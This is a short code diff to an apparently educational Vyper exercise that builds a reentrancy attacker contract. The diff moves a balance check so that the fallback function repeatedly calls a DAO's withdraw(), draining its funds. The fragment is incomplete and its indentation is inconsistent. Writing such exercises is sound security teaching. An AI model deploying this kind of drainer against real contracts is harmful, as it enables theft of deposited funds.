@@ -21,8 +21,8 @@ def _attack() -> bool:
     
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
-    if self.dao_address.balance > 0:
-        self.dao_contract.withdraw()
+
+    self.dao_contract.withdraw()
     return True
 
 @external
@@ -55,7 +55,7 @@ def __default__():
     # NEED SOME KIND OF COUNTER
     # NOT GOING TO DEPOSIT ANYTHING, KNOW THE DAO ADDRESS
     # USE INTERNAL ATTACK FUNCTION
-        self._attack()
+    if self.dao_address.balance > 0:
         self._attack()
 
                        
